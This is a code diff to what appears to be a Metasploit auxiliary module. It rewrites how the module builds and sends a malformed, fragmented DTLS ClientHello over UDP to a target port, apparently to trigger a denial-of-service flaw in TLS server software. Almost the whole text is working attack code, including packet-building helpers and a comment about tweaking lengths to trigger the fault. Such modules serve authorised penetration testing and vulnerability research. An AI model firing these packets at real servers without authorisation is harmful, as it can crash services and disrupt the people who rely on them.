@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'securerandom'
-
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
@@ -35,35 +33,47 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(4433),
+      OptInt.new('VERSION', [true,  "SSl/TLS version", 0xFEFF]),
       OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
     ], self.class)
 
     deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')
   end
 
+  def build_tls_fragment(type, length, seq, frag_offset, frag_length, frag_body=nil)
+    # format is: type (1 byte), total length (3 bytes), sequence # (2 bytes),
+    # fragment offset (3 bytes), fragment length (3 bytes), fragment body
+    sol = (seq << 48) | (frag_offset << 24) | frag_length
+    [
+      (type << 24) | length,
+      (sol >> 32),
+      (sol & 0x00000000FFFFFFFF)
+    ].pack("NNN") + frag_body
+  end
+
+  def build_tls_message(type, version, epoch, sequence, message)
+    # format is: type (1 byte), version (2 bytes), epoch # (2 bytes),
+    # sequence # (6 bytes) + message length (2 bytes), message body
+    es = (epoch << 48) | sequence
+    [
+      type,
+      version,
+      (es >> 32),
+      (es & 0x00000000FFFFFFFF),
+      message.length
+    ].pack("CnNNn") + message
+  end
+
   def run
-    # build first hello fragment
-    hello =  "\x01" # client hello
-    hello << "\x00\x00\x02" # some small length
-    hello << "\x00" * 5 # sequence + offset
-    hello << "\x00\x00\x01" # some small fragment length
-    # add second hello fragment
-    hello << "\x01" # client hello
-    hello << "\x00\xf3\xdb" # some large length
-    hello << "\x00" * 5 # sequence + offset
-    hello << "\x00\x00\x00" # some small fragment length
-    hello << SecureRandom.random_bytes(10) # some random data
-    # build header
-    header = ""
-    header << "\x16" # handshake
-    header << [0xfeff].pack("n")
-    header << "\x00" * 8 # epoch + sequence number
-    header << [hello.length].pack("n")
+    # add a small fragment
+    fragments = build_tls_fragment(1, 2, 0, 0, 1, 'C')
+    # add a large fragment where the length is significantly larger than that of the first
+    # TODO: you'll need to tweak the 2nd, 5th and 6th arguments to trigger the condition in some situations
+    fragments << build_tls_fragment(1, 1234, 0, 0, 123, 'A' * 1234)
+    message = build_tls_message(22, datastore['VERSION'], 0, 0, fragments)
     connect_udp
     print_status("Sending fragmented DTLS client hello packet to #{rhost}:#{rport}")
-    # send the header and hello
-    udp_sock.put(header + hello)
-
+    udp_sock.put(message)
     disconnect_udp
   end
 end
